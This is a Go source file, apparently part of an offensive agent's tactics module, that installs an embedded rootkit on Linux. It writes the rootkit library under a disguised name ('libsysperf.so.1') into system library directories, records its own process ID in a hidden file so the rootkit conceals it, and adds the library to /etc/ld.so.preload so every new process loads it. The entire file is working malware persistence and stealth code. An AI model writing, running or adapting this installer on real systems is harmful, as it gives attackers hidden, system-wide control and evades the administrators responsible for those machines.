package ttp

import (
	"fmt"
	"os"
	"strings"
)

// RootkitSO is the embedded bat-rootkit.so binary.
// Set by the agent's main package via embed   not nil when agent carries the payload.
var RootkitSO []byte

// rootkitSOPath returns the correct .so install path for the current distro.
// B-10: Ubuntu/Debian use /usr/lib/x86_64-linux-gnu/; RHEL uses /usr/lib64/.
func rootkitSOPath() string {
	switch parseDistro() {
	case "rhel", "centos", "fedora", "rocky", "almalinux":
		return "/usr/lib64/libsysperf.so.1"
	default: // ubuntu, debian, and anything else
		return "/usr/lib/x86_64-linux-gnu/libsysperf.so.1"
	}
}

// HideMarkPath is the file where we write our PID so the rootkit knows what to hide.
const HideMarkPath = "/tmp/.sysd"

// PreloadPath is the ld.so.preload file.
const PreloadPath = "/etc/ld.so.preload"

// InstallRootkit writes the embedded .so to disk, registers our PID in the mark file,
// and adds the .so path to /etc/ld.so.preload.
// After this call, every new process on the system loads the rootkit automatically.
func InstallRootkit() (string, error) {
	if len(RootkitSO) == 0 {
		return "", fmt.Errorf("rootkit payload not embedded in this build")
	}

	soPath := rootkitSOPath()

	// Write the .so   world-readable so ld.so can load it for all processes
	if err := os.WriteFile(soPath, RootkitSO, 0755); err != nil {
		return "", fmt.Errorf("write .so: %w", err)
	}

	// Register our PID in the mark file so the rootkit hides us
	if err := writePIDMark(HideMarkPath); err != nil {
		return "", fmt.Errorf("write pid mark: %w", err)
	}

	// Add to /etc/ld.so.preload (idempotent   won't duplicate)
	if err := addToPreload(soPath); err != nil {
		return "", fmt.Errorf("update ld.so.preload: %w", err)
	}

	return fmt.Sprintf("rootkit installed: %s → /etc/ld.so.preload (distro: %s)", soPath, parseDistro()), nil
}

func writePIDMark(path string) error {
	pid := fmt.Sprintf("%d\n", os.Getpid())
	// 0644: world-readable so rootkit can read it from any process context
	f, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(pid)
	return err
}

func addToPreload(soPath string) error {
	// Read current content
	existing := ""
	data, err := os.ReadFile(PreloadPath)
	if err == nil {
		existing = string(data)
	}

	// Idempotent   don't add if already present
	for _, line := range strings.Split(existing, "\n") {
		if strings.TrimSpace(line) == soPath {
			return nil
		}
	}

	// Append
	f, err := os.OpenFile(PreloadPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	entry := soPath + "\n"
	_, err = f.WriteString(entry)
	return err
}
